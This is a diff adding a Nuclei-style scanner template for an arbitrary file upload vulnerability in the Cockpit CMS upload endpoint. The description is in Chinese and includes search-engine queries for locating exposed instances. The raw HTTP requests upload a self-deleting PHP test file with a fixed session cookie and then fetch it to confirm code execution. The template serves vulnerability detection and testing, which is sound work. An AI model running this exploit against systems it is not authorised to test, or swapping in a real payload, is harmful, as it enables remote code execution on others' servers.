@@ -1,0 +1,43 @@
+id: cockpit-upload-file-upload
+
+info:
+  name: Cockpit系统upload接口任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: Fofa：title="Authenticate Please!" 或 quake：title:"Authenticate Please!" 或 hunter：web.title="Authenticate Please!"
+          Cockpit系统upload接口存在文件上传路径验证缺陷，攻击者可构造恶意文件通过该接口实现任意代码上传。成功利用可导致远程代码执行并获取服务器控制权限，最终实现对目标Web服务器的完全控制。
+  tags: Cockpit
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /assetsmanager/upload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=---------------------------36D28FBc36bd6feE7Fb3
+    Cookie: mysession=95524f01e238bf51bb60d77ede3bea92
+
+    -----------------------------36D28FBc36bd6feE7Fb3
+    Content-Disposition: form-data; name="files[]"; filename="NTest.php"
+    Content-Type: text/php
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    -----------------------------36D28FBc36bd6feE7Fb3
+    Content-Disposition: form-data; name="folder"
+
+    -----------------------------36D28FBc36bd6feE7Fb3--
+- raw:
+  - |
+    GET /storage/uploads/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
